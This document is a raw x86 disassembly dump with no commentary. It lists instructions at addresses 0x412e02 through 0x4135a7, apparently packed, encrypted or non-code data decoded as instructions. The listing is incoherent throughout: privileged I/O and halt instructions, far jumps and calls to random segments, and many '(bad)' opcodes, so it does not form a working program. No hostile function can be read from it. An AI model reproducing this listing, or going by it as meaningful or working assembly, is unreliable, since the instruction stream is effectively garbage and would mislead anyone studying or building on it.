  412e02:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412e03:	jno    0x412dc1
  412e05:	gs inc ebp
  412e07:	mov    ds:0xdf39eca,eax
  412e0c:	aaa    
  412e0d:	xor    BYTE PTR [edx+0x6ee6984a],cl
  412e13:	jp     0x412e31
  412e15:	mov    bl,0x4e
  412e17:	push   ebx
  412e18:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412e19:	call   0xfe1ad391
  412e1e:	push   di
  412e20:	ret    0xa637
  412e23:	xchg   ecx,eax
  412e24:	pop    ss
  412e25:	inc    esi
  412e26:	retf   
  412e27:	imul   eax,DWORD PTR [ecx+ecx*8-0x6080b6a2],0x87ee3f5d
  412e32:	mov    ch,0xa9
  412e34:	cmp    BYTE PTR [eax],0x77
  412e37:	js     0x412e49
  412e39:	rcr    BYTE PTR [ecx-0x4f],1
  412e3c:	and    ebx,edi
  412e3e:	lahf   
  412e3f:	leave  
  412e40:	test   BYTE PTR [edi-0x2d9f4868],0xe8
  412e47:	cmp    BYTE PTR [edi],bl
  412e49:	retf   0x665f
  412e4c:	adc    DWORD PTR [edi+0x4f],edi
  412e4f:	dec    BYTE PTR [ebx-0x6b2a74b5]
  412e55:	push   0xffffffec
  412e57:	cld    
  412e58:	jno    0x412eb9
  412e5a:	les    edx,FWORD PTR ds:0x143f5c6f
  412e60:	loopne 0x412ec5
  412e62:	pop    ecx
  412e63:	and    eax,0xf6fae614
  412e68:	data16 loop 0x412e1c
  412e6b:	inc    esp
  412e6c:	mov    al,0x57
  412e6e:	and    eax,0x492f0d78
  412e73:	jmp    0x412e52
  412e75:	mov    ecx,0xf7b491e9
  412e7a:	fs fs push ss
  412e7d:	mov    ch,BYTE PTR [esi]
  412e7f:	mov    bh,0x37
  412e81:	sti    
  412e82:	vandpd xmm3,xmm2,XMMWORD PTR [ebx+0x48ca5049]
  412e8b:	dec    esi
  412e8c:	push   esi
  412e8d:	xchg   edx,eax
  412e8e:	aam    0xcc
  412e90:	ja     0x412ea3
  412e92:	cmp    ecx,DWORD PTR [edi+0x2b586483]
  412e98:	outs   dx,DWORD PTR ds:[esi]
  412e99:	cwde   
  412e9a:	push   esp
  412e9b:	hlt    
  412e9c:	mov    esi,DWORD PTR [ecx+0x5f]
  412e9f:	push   esp
  412ea0:	mov    eax,ds:0xf60e02c3
  412ea5:	rcl    BYTE PTR [edi+ecx*2+0x4682ed19],0x89
  412ead:	sar    DWORD PTR [esi-0x12],cl
  412eb0:	mov    edi,0x24fe2ec2
  412eb5:	outs   dx,BYTE PTR ds:[esi]
  412eb6:	popf   
  412eb7:	js     0x412e8a
  412eb9:	dec    eax
  412eba:	mov    ebp,0x43b4fd6b
  412ebf:	mov    bh,0x4c
  412ec1:	mov    BYTE PTR [ebx+0x24],dh
  412ec4:	cmp    al,0x96
  412ec6:	or     DWORD PTR [edi-0x6],ebx
  412ec9:	adc    eax,0x87e53da2
  412ece:	add    al,0x8b
  412ed0:	cli    
  412ed1:	mov    ds:0xc5942a06,eax
  412ed6:	je     0x412f21
  412ed8:	rcr    DWORD PTR [ecx],1
  412eda:	pop    ebp
  412edb:	cld    
  412edc:	shr    DWORD PTR [esi],0xe6
  412edf:	jae    0x412e86
  412ee1:	pop    ecx
  412ee2:	ins    DWORD PTR es:[edi],dx
  412ee3:	rcr    DWORD PTR [ecx],0xed
  412ee6:	pop    ebp
  412ee7:	mov    ecx,0xa96eb831
  412eec:	fsubp  st(0),st
  412eee:	out    dx,eax
  412eef:	dec    edx
  412ef0:	fmul   DWORD PTR [esi]
  412ef2:	mov    ds:0x530cee65,al
  412ef7:	stos   BYTE PTR es:[edi],al
  412ef8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412ef9:	sub    esi,DWORD PTR [ecx+0x60cda0ff]
  412eff:	push   cs
  412f00:	or     bl,cl
  412f02:	add    al,0x4a
  412f04:	pushf  
  412f05:	popa   
  412f06:	mov    edx,0x9ef42291
  412f0b:	aaa    
  412f0c:	aad    0xdc
  412f0e:	fisttp DWORD PTR [ebp+0x34d70c97]
  412f14:	or     al,bh
  412f16:	cmp    al,0xf1
  412f18:	mov    dh,0xfb
  412f1a:	xor    al,0xc9
  412f1c:	sub    al,0x20
  412f1e:	adc    ebx,ebp
  412f20:	pop    esi
  412f21:	pop    ecx
  412f22:	shl    DWORD PTR [ecx+0xd7cee32],0x2e
  412f29:	sbb    ah,dh
  412f2b:	jb     0x412f81
  412f2d:	in     eax,0x2f
  412f2f:	jbe    0x412eed
  412f31:	test   eax,0xf8bf0d2b
  412f36:	into   
  412f37:	outs   dx,BYTE PTR ds:[esi]
  412f38:	and    eax,0xed0592d1
  412f3d:	scas   al,BYTE PTR es:[edi]
  412f3e:	shr    ebp,0x92
  412f41:	sbb    eax,eax
  412f43:	xchg   edi,eax
  412f44:	pop    edi
  412f45:	jnp    0x412f89
  412f47:	and    BYTE PTR [ebx],ah
  412f49:	cmp    DWORD PTR [edx+0xf],ecx
  412f4c:	(bad)  
  412f4d:	push   ebx
  412f4e:	lods   al,BYTE PTR ds:[esi]
  412f4f:	aas    
  412f50:	push   edx
  412f51:	dec    esp
  412f52:	jno    0x412f85
  412f54:	ret    
  412f55:	inc    eax
  412f56:	div    DWORD PTR [ecx]
  412f58:	push   es
  412f59:	repnz ds nop
  412f5c:	sbb    edi,DWORD PTR [esi]
  412f5e:	test   BYTE PTR [ecx-0x73350ccc],0x4b
  412f65:	inc    ebx
  412f66:	mov    cs,WORD PTR [edi]
  412f68:	lods   al,BYTE PTR ds:[esi]
  412f69:	gs fsub st,st(4)
  412f6c:	daa    
  412f6d:	cmp    BYTE PTR [ecx],al
  412f6f:	and    DWORD PTR [esi+0x73],ecx
  412f72:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412f73:	add    al,0x4d
  412f75:	jmp    0x7799:0x2687d935
  412f7c:	out    dx,al
  412f7d:	ret    0x9027
  412f80:	stos   BYTE PTR es:[edi],al
  412f81:	shr    DWORD PTR [edi+ebp*4-0x68],0xc
  412f86:	and    al,BYTE PTR ds:0x4f4cf2a3
  412f8c:	adc    esi,DWORD PTR [ecx]
  412f8e:	xor    eax,0x74154ebc
  412f93:	lods   al,BYTE PTR ds:[esi]
  412f94:	nop
  412f95:	into   
  412f96:	push   0x37
  412f98:	loopne 0x412f9b
  412f9a:	sbb    al,0xdc
  412f9c:	stos   BYTE PTR es:[edi],al
  412f9d:	aaa    
  412f9e:	fdivrp st(3),st
  412fa0:	nop
  412fa1:	push   DWORD PTR [ecx]
  412fa3:	xchg   edx,eax
  412fa4:	ret    
  412fa5:	test   BYTE PTR [esi+ecx*8+0x49a0e246],dh
  412fac:	cld    
  412fad:	add    al,0xb1
  412faf:	pop    ecx
  412fb0:	rcl    ebx,cl
  412fb2:	jmp    0xe78327e
  412fb7:	mov    cl,0x64
  412fb9:	ss out 0x79,eax
  412fbc:	retf   
  412fbd:	jecxz  0x412fe0
  412fbf:	and    BYTE PTR [edx-0x45c34206],cl
  412fc5:	jmp    0x41301f
  412fc7:	adc    al,0x12
  412fc9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412fcb:	mov    ebp,0xa333d8e
  412fd0:	push   ds
  412fd1:	push   es
  412fd2:	or     al,0xe1
  412fd4:	jg     0x41300b
  412fd6:	or     al,0x16
  412fd8:	(bad)  
  412fd9:	mov    esp,0xc70d4311
  412fde:	add    al,0x50
  412fe0:	nop
  412fe1:	inc    edx
  412fe2:	cmc    
  412fe3:	psrld  mm4,QWORD PTR [ecx-0x50]
  412fe7:	lods   al,BYTE PTR ds:[esi]
  412fe8:	(bad)  
  412fe9:	les    esi,FWORD PTR [ecx+0x5e60df8f]
  412fef:	push   ebx
  412ff0:	shl    DWORD PTR [edi+edx*8+0x30],1
  412ff4:	cmp    DWORD PTR [ebp-0x41],edx
  412ff7:	sbb    DWORD PTR [esi],edi
  412ff9:	enter  0x450,0xda
  412ffd:	sbb    bl,BYTE PTR [edx-0x61]
  413000:	inc    ebp
  413001:	push   ds
  413002:	push   0xffffffe4
  413004:	or     BYTE PTR [esi-0x2f],al
  413007:	es jne 0x413012
  41300a:	push   cs
  41300b:	out    0x52,al
  41300d:	ins    DWORD PTR es:[edi],dx
  41300e:	(bad)  
  41300f:	mov    cl,0xeb
  413011:	aad    0x7a
  413013:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413014:	or     al,0xa
  413016:	retf   
  413017:	nop
  413018:	xlat   BYTE PTR ds:[ebx]
  413019:	push   esp
  41301a:	ja     0x413023
  41301c:	icebp  
  41301d:	fadd   DWORD PTR [esi]
  41301f:	xlat   BYTE PTR ds:[ebx]
  413020:	mov    dl,0x6b
  413022:	in     al,dx
  413023:	sbb    ch,BYTE PTR [ebx+0x55c0b7d8]
  413029:	fcmovne st,st(1)
  41302b:	ja     0x412ff8
  41302d:	sbb    ecx,DWORD PTR [eax+ebx*1]
  413030:	sub    al,0x52
  413032:	xchg   esi,eax
  413033:	pop    ebx
  413034:	cmp    al,0x8d
  413036:	jmp    0x412ff5
  413038:	sub    BYTE PTR [ebp-0x12],dh
  41303b:	cmp    DWORD PTR [eax-0x10ed7e9f],0x76131398
  413045:	adc    esi,edx
  413047:	cmp    BYTE PTR [edx+edi*2+0x2f],0x3d
  41304c:	mov    WORD PTR [edi-0x57],?
  41304f:	mov    ebp,0xd5ffac95
  413054:	test   DWORD PTR [ebx+0x2548123],edx
  41305a:	pop    ecx
  41305b:	out    dx,al
  41305c:	xchg   BYTE PTR [ebp+0x57],al
  41305f:	(bad)  
  413060:	pop    eax
  413061:	xor    cl,BYTE PTR [eax+ecx*2]
  413064:	test   ebx,0x4daff651
  41306a:	in     al,dx
  41306b:	push   edx
  41306c:	mov    eax,0x5be59252
  413071:	icebp  
  413072:	mov    bh,0x20
  413074:	mov    BYTE PTR [esi-0x6c],bh
  413077:	jl     0x41300c
  413079:	mov    ebx,edi
  41307b:	test   eax,0x5ef3b891
  413080:	mov    eax,0x1bd9df2f
  413085:	inc    esp
  413086:	dec    ebp
  413087:	mov    ds:0x2f64e04f,al
  41308c:	adc    ebx,DWORD PTR [edi]
  41308e:	lds    ecx,FWORD PTR [eax-0x6e4cac11]
  413094:	fdivp  st(6),st
  413096:	les    ebp,FWORD PTR [eax+0x1a94d156]
  41309c:	lods   al,BYTE PTR ds:[esi]
  41309d:	outs   dx,DWORD PTR ds:[esi]
  41309e:	loop   0x413067
  4130a0:	push   esp
  4130a1:	loope  0x4130d1
  4130a3:	outs   dx,DWORD PTR ds:[esi]
  4130a4:	jns    0x41307b
  4130a6:	mov    esi,0xf5080ff8
  4130ab:	icebp  
  4130ac:	sub    al,0xa6
  4130ae:	xor    eax,0x822eb8ef
  4130b3:	xchg   ebx,eax
  4130b4:	pop    ebx
  4130b5:	xchg   BYTE PTR [esi],dh
  4130b7:	jmp    0x22df:0x56d2fdb6
  4130be:	dec    esi
  4130bf:	les    edi,FWORD PTR [edi+0x5ec28de8]
  4130c5:	jp     0x413062
  4130c7:	pop    ds
  4130c8:	data16 hlt 
  4130ca:	xchg   esp,eax
  4130cb:	pushf  
  4130cc:	jnp    0x413131
  4130ce:	imul   ecx,DWORD PTR [eax],0xb62a5462
  4130d4:	dec    ebp
  4130d5:	fstp   DWORD PTR [eax-0x7981541d]
  4130db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4130dc:	je     0x41310f
  4130de:	js     0x413106
  4130e0:	sahf   
  4130e1:	call   0xac19:0x378ee770
  4130e8:	into   
  4130e9:	dec    edi
  4130ea:	xlat   BYTE PTR ds:[ebx]
  4130eb:	hlt    
  4130ec:	inc    ecx
  4130ed:	mov    ebx,0x2e9888e7
  4130f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4130f3:	(bad)  
  4130f4:	(bad)
  4130f7:	or     ebx,DWORD PTR [edi+0x68]
  4130fa:	in     al,0x2
  4130fc:	scas   eax,DWORD PTR es:[edi]
  4130fd:	dec    eax
  4130fe:	cdq    
  4130ff:	into   
  413100:	push   0x1a
  413102:	jno    0x41312a
  413104:	xchg   cl,al
  413106:	jo     0x4130dd
  413108:	pop    esp
  413109:	push   esi
  41310a:	dec    esi
  41310b:	mov    al,ds:0x7126b3e4
  413110:	aad    0xca
  413112:	inc    ebx
  413113:	int3   
  413114:	xor    BYTE PTR [esi],0xf
  413117:	leave  
  413118:	pop    ecx
  413119:	out    0x8e,al
  41311b:	call   0xf913:0x89aa77f1
  413122:	sub    ecx,DWORD PTR [edx]
  413124:	xor    eax,0x95b0726
  413129:	(bad)  
  41312b:	mov    dh,0xf0
  41312d:	mov    bh,0x47
  41312f:	push   edi
  413130:	in     al,0x98
  413132:	xchg   ecx,eax
  413133:	inc    ecx
  413134:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413135:	lods   al,BYTE PTR ds:[esi]
  413136:	add    esi,edi
  413138:	add    bl,BYTE PTR [ebx-0x40]
  41313b:	retf   
  41313c:	shl    DWORD PTR [esp],0xa1
  413140:	push   cs
  413141:	stos   BYTE PTR es:[edi],al
  413142:	inc    esp
  413143:	pop    eax
  413144:	in     al,0xc8
  413146:	mov    eax,0x59f434c7
  41314b:	mov    dh,0xbc
  41314d:	shl    esi,cl
  41314f:	scas   al,BYTE PTR es:[edi]
  413150:	adc    edi,DWORD PTR [ecx+ebp*4]
  413153:	inc    ecx
  413154:	mov    eax,ds:0x888781ad
  413159:	push   eax
  41315a:	ret    0xa23e
  41315d:	mov    edx,0xe3f7724b
  413162:	(bad)  
  413163:	mov    eax,ds:0x57c8c4ed
  413168:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413169:	xor    dh,ch
  41316b:	into   
  41316c:	or     DWORD PTR [eax-0xcbd44fd],ecx
  413172:	std    
  413173:	(bad)  
  413174:	int    0x9c
  413176:	jae    0x413187
  413178:	leave  
  413179:	gs pop edi
  41317b:	retf   
  41317c:	mov    edi,0x9f630849
  413181:	mov    WORD PTR [edi+edi*2-0x1],?
  413185:	fsubr  QWORD PTR [edi]
  413187:	xchg   edx,eax
  413188:	clc    
  413189:	push   eax
  41318a:	into   
  41318b:	fistp  DWORD PTR [edx-0x28]
  41318e:	xchg   esi,eax
  41318f:	cld    
  413190:	outs   dx,BYTE PTR ds:[esi]
  413191:	push   ecx
  413192:	sbb    ebx,ebx
  413194:	sbb    edx,0x3f
  413197:	lahf   
  413198:	sbb    al,0x5
  41319a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41319b:	xor    ebx,esp
  41319d:	mov    esi,DWORD PTR [edi+ebx*4]
  4131a0:	lods   eax,DWORD PTR ds:[esi]
  4131a1:	repz in al,dx
  4131a3:	push   esi
  4131a4:	ins    BYTE PTR es:[edi],dx
  4131a5:	sbb    DWORD PTR [esi-0x43c471d1],0xfffffffb
  4131ac:	xor    eax,DWORD PTR [ecx+0x69]
  4131af:	(bad)  
  4131b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4131b1:	out    0x46,eax
  4131b3:	mov    ebp,DWORD PTR [ecx+0x1f]
  4131b6:	and    eax,0x736f4430
  4131bb:	mov    ah,0xad
  4131bd:	jmp    0x26fe:0x9f937fff
  4131c4:	and    al,0x5f
  4131c6:	ret    
  4131c7:	inc    ebp
  4131c8:	pop    esi
  4131c9:	cdq    
  4131ca:	adc    cl,BYTE PTR [ebx]
  4131cc:	fdivrp st(7),st
  4131ce:	or     ebx,esi
  4131d0:	std    
  4131d1:	ss pop ebx
  4131d3:	xchg   DWORD PTR [esi],edi
  4131d5:	inc    ebx
  4131d6:	icebp  
  4131d7:	fistp  QWORD PTR [edx]
  4131d9:	enter  0xb711,0x11
  4131dd:	sahf   
  4131de:	aas    
  4131df:	fistp  WORD PTR [edx+0x4b]
  4131e2:	jle    0x4131af
  4131e4:	mov    dh,bl
  4131e6:	sti    
  4131e7:	test   DWORD PTR [ebx-0x1166653e],ebp
  4131ed:	lds    eax,FWORD PTR [ecx]
  4131ef:	sub    bl,BYTE PTR [ebx-0x24]
  4131f2:	push   edx
  4131f3:	int    0xb7
  4131f5:	stos   DWORD PTR es:[edi],eax
  4131f6:	mov    eax,0x6ebdd98f
  4131fb:	sub    eax,0x2148969d
  413200:	mov    WORD PTR [edx+0x6b004dfa],cs
  413206:	pop    ecx
  413207:	cwde   
  413208:	inc    esi
  413209:	inc    ebp
  41320a:	dec    eax
  41320b:	adc    al,0x86
  41320d:	xchg   ebp,eax
  41320e:	dec    ebp
  41320f:	pop    eax
  413210:	mov    cl,0x2
  413212:	bnd jns 0x413266
  413215:	les    eax,FWORD PTR [eax]
  413217:	je     0x413273
  413219:	les    edi,FWORD PTR [ebp+0x55]
  41321c:	shl    BYTE PTR ds:0x644b71a7,cl
  413222:	bound  ebx,QWORD PTR [edx+ebx*8-0x723f8fbc]
  413229:	mov    ah,0xb4
  41322b:	fstp   DWORD PTR ds:0xc9ba00fc
  413231:	inc    ebx
  413232:	fidivr WORD PTR [edi]
  413234:	cmc    
  413235:	popa   
  413236:	into   
  413237:	hlt    
  413238:	dec    esp
  413239:	(bad)  
  41323a:	gs mov ch,dh
  41323d:	push   esp
  41323e:	ss test dl,0x60
  413242:	dec    ebp
  413243:	jbe    0x41321b
  413245:	out    dx,eax
  413246:	loopne 0x413201
  413248:	push   es
  413249:	cmp    bl,BYTE PTR [ecx]
  41324b:	adc    eax,0xb788c989
  413250:	or     cl,BYTE PTR ds:0x9dd5be4b
  413256:	idiv   DWORD PTR [eax+0x34e48af8]
  41325c:	outs   dx,BYTE PTR ds:[esi]
  41325d:	sub    esi,DWORD PTR [ebx+0x4a509294]
  413263:	adc    eax,0x561b8643
  413268:	sub    eax,0xda0a2fda
  41326d:	add    cl,ch
  41326f:	and    BYTE PTR [ecx+0x32],dh
  413272:	xor    ch,BYTE PTR [ebx]
  413274:	popa   
  413275:	xchg   ah,ch
  413277:	dec    eax
  413278:	inc    DWORD PTR [ecx+ebx*4-0x5e264fa0]
  41327f:	xor    dh,BYTE PTR [ecx-0x75bee000]
  413285:	push   ds
  413286:	jecxz  0x4132ab
  413288:	cld    
  413289:	test   DWORD PTR ds:0x98055e7a,ebx
  41328f:	test   al,0x3b
  413291:	add    eax,0x48b86f6
  413296:	or     al,0x95
  413298:	add    DWORD PTR [edx-0x2],eax
  41329b:	cld    
  41329c:	push   edx
  41329d:	in     al,dx
  41329e:	add    ah,dh
  4132a0:	fiadd  DWORD PTR [ecx+0x7d]
  4132a3:	or     ebp,ebx
  4132a5:	pop    ds
  4132a6:	pop    eax
  4132a7:	adc    BYTE PTR [esi+0x1a6815a0],bh
  4132ad:	(bad)  
  4132ae:	add    esp,DWORD PTR [ebx-0x3e]
  4132b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4132b2:	cmp    eax,0x3f43d223
  4132b7:	in     al,0x97
  4132b9:	cmp    esp,DWORD PTR [ebx-0x2f55c3a5]
  4132bf:	fiadd  WORD PTR [eax-0x73]
  4132c2:	add    bh,ch
  4132c4:	mov    ah,0x55
  4132c6:	mov    WORD PTR [eax+0x240f9168],cs
  4132cc:	ja     0x41326d
  4132ce:	add    esi,DWORD PTR [edi+0x4375672c]
  4132d4:	xor    BYTE PTR [edx+0x51c1601c],dh
  4132da:	loop   0x4132f8
  4132dc:	retf   0xbba1
  4132df:	sbb    al,0x6b
  4132e1:	push   0x8009268f
  4132e6:	push   edx
  4132e7:	(bad)  
  4132e9:	into   
  4132ea:	mov    ebx,edi
  4132ec:	dec    ecx
  4132ed:	icebp  
  4132ee:	inc    esp
  4132ef:	jae    0x4132ca
  4132f1:	cmp    BYTE PTR [edx-0x71],cl
  4132f4:	out    dx,al
  4132f5:	lods   eax,DWORD PTR ds:[esi]
  4132f6:	inc    edi
  4132f7:	shr    BYTE PTR [ecx-0x676d7f9d],0x95
  4132fe:	pop    ss
  4132ff:	mov    ecx,0x51b84c15
  413304:	ret    0x6cd0
  413307:	mov    edi,0xc683a714
  41330c:	int    0x1
  41330e:	sbb    WORD PTR [ecx+0x207ae11a],0xffd9
  413316:	pop    eax
  413317:	pop    edi
  413318:	test   BYTE PTR [ebx+0x54],cl
  41331b:	push   ebp
  41331c:	mov    cl,0xef
  41331e:	pop    ss
  41331f:	pusha  
  413320:	mov    BYTE PTR [ebx],bl
  413322:	aaa    
  413323:	inc    ebx
  413324:	out    0x42,eax
  413326:	dec    esp
  413327:	test   eax,0x5a3c6bcc
  41332c:	fisttp QWORD PTR [ebx-0x39e869dc]
  413332:	loope  0x413327
  413334:	mov    eax,0xaa596b90
  413339:	clc    
  41333a:	mov    ds:0xc8bd4886,al
  41333f:	shr    BYTE PTR [eax],1
  413341:	lea    esi,[ebp+ecx*4+0xd1503b6]
  413348:	mov    ds:0xdcf532ef,al
  41334d:	or     edx,DWORD PTR [edi]
  41334f:	jb     0x41333f
  413351:	cld    
  413352:	mov    ah,0x29
  413354:	adc    BYTE PTR [edx+0x54689651],bh
  41335a:	retf   0xb892
  41335d:	(bad)  
  41335e:	call   DWORD PTR [esi+0x293a6f00]
  413364:	mov    cl,0xf6
  413366:	cmp    eax,0xa418897a
  41336b:	jo     0x41330e
  41336d:	aam    0x29
  41336f:	dec    ebp
  413370:	jne    0x4133ab
  413372:	hlt    
  413373:	mov    ds:0x3286fc88,al
  413378:	out    dx,eax
  413379:	jne    0x4133c3
  41337b:	jmp    0x857d2cc1
  413380:	jmp    0xe1f7:0x5f917562
  413387:	mov    BYTE PTR [ecx+0x0],al
  41338a:	cmp    ecx,DWORD PTR [ebx+0x5f95e18b]
  413390:	cmp    ecx,DWORD PTR [ecx-0x65970326]
  413396:	push   0xaf5029c2
  41339b:	in     al,dx
  41339c:	push   ebp
  41339d:	jo     0x4133e5
  41339f:	push   esi
  4133a0:	add    DWORD PTR [edx],esi
  4133a2:	pop    ebx
  4133a3:	aad    0x0
  4133a5:	mov    eax,0xc10fea3f
  4133aa:	sub    al,0x80
  4133ac:	cmp    al,0xd9
  4133ae:	sbb    DWORD PTR [esi+0x2323f536],eax
  4133b4:	in     al,dx
  4133b5:	add    DWORD PTR [esi-0x22d5a544],0x1e45e588
  4133bf:	addr16 cwde 
  4133c1:	rcr    DWORD PTR [esi],cl
  4133c3:	cwde   
  4133c4:	or     bh,BYTE PTR [ebx]
  4133c6:	push   ebp
  4133c7:	pop    es
  4133c8:	aaa    
  4133c9:	dec    ecx
  4133ca:	daa    
  4133cb:	sbb    al,0xe8
  4133cd:	xchg   BYTE PTR ss:[eax],dh
  4133d0:	add    ecx,eax
  4133d2:	scas   al,BYTE PTR es:[edi]
  4133d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4133d4:	adc    BYTE PTR [edx+0x55],dh
  4133d7:	in     eax,0x99
  4133d9:	push   ebp
  4133da:	or     cl,BYTE PTR [ebp-0x5b]
  4133dd:	stc    
  4133de:	xchg   ebx,eax
  4133df:	mov    al,0x44
  4133e1:	xor    eax,0x4b12229a
  4133e6:	sar    al,cl
  4133e8:	imul   edi,eax,0x16577957
  4133ee:	aam    0x5c
  4133f0:	cmc    
  4133f1:	clc    
  4133f2:	adc    dh,BYTE PTR [ecx+0x1f]
  4133f5:	pop    eax
  4133f6:	ret    
  4133f7:	push   0xe
  4133f9:	call   0xa41a5da5
  4133fe:	xor    ebp,DWORD PTR [ebx]
  413400:	sbb    edi,ebx
  413402:	jae    0x4133dc
  413404:	(bad)  
  413405:	fadd   st(3),st
  413407:	(bad)  
  413408:	xor    bl,BYTE PTR [ecx+0x3e]
  41340b:	inc    edi
  41340c:	or     BYTE PTR [ebx],bl
  41340e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41340f:	fidiv  DWORD PTR [ecx-0x5c4ff77]
  413415:	push   esp
  413416:	pop    ds
  413417:	jbe    0x413458
  413419:	aaa    
  41341a:	adc    bh,bh
  41341c:	mov    al,ds:0x93783442
  413421:	loop   0x413498
  413423:	jl     0x4133f8
  413425:	inc    esi
  413426:	mov    ds:0x863bee10,al
  41342b:	cmp    al,BYTE PTR [edx+0x75f66a9b]
  413431:	sbb    BYTE PTR [edi],dl
  413433:	test   BYTE PTR [eax+esi*4+0x510bacfa],dh
  41343a:	pop    ss
  41343b:	jae    0x41341c
  41343d:	sub    al,0x19
  41343f:	mov    al,0x22
  413441:	pop    esi
  413442:	or     bl,BYTE PTR [ebp-0x71ffa09]
  413448:	lock loope 0x41341e
  41344b:	(bad)  
  41344c:	fisttp WORD PTR [ecx+0x43]
  41344f:	sahf   
  413450:	cmp    ah,BYTE PTR [esi-0x596ab15a]
  413456:	add    bl,cl
  413458:	mov    al,ds:0x65b27ff0
  41345d:	add    ebp,DWORD PTR [eax]
  41345f:	dec    esi
  413460:	enter  0x77e6,0xbf
  413464:	mov    edx,0x6a52755b
  413469:	int    0x4a
  41346b:	mov    esp,0xadc69cd2
  413470:	or     esi,DWORD PTR [edx]
  413472:	mov    edi,0x997a1e77
  413477:	jg     0x413462
  413479:	addr16 mov edx,0x15e3caf1
  41347f:	cs ret 
  413481:	pop    eax
  413482:	sbb    ebp,DWORD PTR [ebp-0x73]
  413485:	push   esi
  413486:	ret    
  413487:	or     BYTE PTR [esp+0x71a69e4],dh
  41348e:	adc    DWORD PTR [edx-0x4b],eax
  413491:	retf   0xd881
  413494:	or     dl,ah
  413496:	outs   dx,BYTE PTR ds:[esi]
  413497:	std    
  413498:	gs out 0x7e,eax
  41349b:	jmp    0x1c12:0x3cd7a595
  4134a2:	ret    0xcb64
  4134a5:	jmp    0x5da8:0xc2a426f9
  4134ac:	pop    ebx
  4134ae:	std    
  4134af:	xchg   ebp,eax
  4134b0:	imul   esp,ebp,0xf85c2423
  4134b6:	(bad)  
  4134b7:	test   al,0x2
  4134b9:	aaa    
  4134ba:	pushf  
  4134bb:	lahf   
  4134bc:	out    dx,eax
  4134bd:	jmp    FWORD PTR [eax-0x38]
  4134c0:	xchg   esi,eax
  4134c1:	inc    esi
  4134c2:	neg    BYTE PTR [esi-0x71a6f979]
  4134c8:	push   edi
  4134c9:	mov    WORD PTR [ecx+0x4e],?
  4134cc:	sar    BYTE PTR [esi+0x630e4373],0xab
  4134d3:	popf   
  4134d4:	int3   
  4134d5:	and    DWORD PTR [ecx-0x251a623a],ebp
  4134db:	test   al,0xe9
  4134dd:	retf   
  4134de:	sub    dl,BYTE PTR [edx+0x75]
  4134e1:	or     bh,BYTE PTR ds:0x4f7347a
  4134e7:	pop    ds
  4134e8:	mov    DWORD PTR [edi+edx*2-0x3a],esp
  4134ec:	dec    ecx
  4134ed:	adc    DWORD PTR [edi-0x26],edx
  4134f0:	jl     0x41347c
  4134f2:	inc    edi
  4134f3:	inc    esi
  4134f4:	mov    edx,0xb1afbb19
  4134f9:	ins    BYTE PTR es:[edi],dx
  4134fa:	xor    al,0x5
  4134fc:	pop    eax
  4134fd:	sti    
  4134fe:	scas   al,BYTE PTR es:[edi]
  4134ff:	xor    eax,0xbc4cf582
  413504:	push   0xffffffea
  413506:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413507:	adc    al,dh
  413509:	les    edx,FWORD PTR [eax+ebx*1-0x3c71380b]
  413510:	xor    eax,0x8d122218
  413515:	inc    esi
  413516:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413517:	leave  
  413518:	test   eax,0x6365d178
  41351d:	repz shl eax,0x3b
  413521:	je     0x4134e6
  413523:	mov    dl,0xec
  413525:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413526:	dec    eax
  413527:	push   ebp
  413528:	shl    DWORD PTR [ecx],0xd5
  41352b:	jbe    0x4134ec
  41352d:	nop
  41352e:	inc    eax
  41352f:	fst    QWORD PTR [edi]
  413531:	arpl   WORD PTR [ecx],bx
  413533:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413534:	sub    dh,BYTE PTR [edx-0x78]
  413537:	mov    esp,0xe20ac048
  41353c:	cmp    ch,ch
  41353e:	inc    ecx
  41353f:	inc    ebx
  413540:	xor    ch,ah
  413542:	inc    edi
  413543:	mov    ebx,0x4d5badde
  413548:	sbb    DWORD PTR [edx],0x426bbe8
  41354e:	push   edi
  41354f:	xor    ecx,DWORD PTR [edi]
  413551:	(bad)  
  413552:	es xor eax,0x6f31f9f5
  413558:	ins    DWORD PTR es:[edi],dx
  413559:	fbld   TBYTE PTR [edi]
  41355b:	sub    dl,0x8d
  41355e:	push   ebp
  41355f:	jge    0x413518
  413561:	loopne 0x413526
  413563:	cmp    DWORD PTR [edx-0x3],0xffffffa8
  413567:	int3   
  413568:	jecxz  0x4135e3
  41356a:	cmp    DWORD PTR [edi-0x6b13ac24],eax
  413570:	js     0x41359d
  413572:	jae    0x41354b
  413574:	mov    eax,0xffbae4e4
  413579:	lock push ecx
  41357b:	cli    
  41357c:	adc    ah,al
  41357e:	xchg   esp,eax
  41357f:	xor    ah,cl
  413581:	fldenv [esi-0x56]
  413584:	mov    cl,0x65
  413586:	out    dx,eax
  413587:	pushf  
  413588:	mov    DWORD PTR [edi+0x75016f47],ecx
  41358e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41358f:	mov    ebx,0xbb66ff7b
  413594:	adc    ebx,DWORD PTR [ebp+0x72]
  413597:	icebp  
  413598:	adc    al,0xc
  41359a:	dec    ebp
  41359b:	imul   edi,DWORD PTR [ebp-0x20],0x53
  41359f:	pop    ebx
  4135a0:	jge    0x4135d5
  4135a2:	int    0xb0
  4135a4:	dec    eax
  4135a5:	int3   
  4135a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4135a7:	pop    ecx
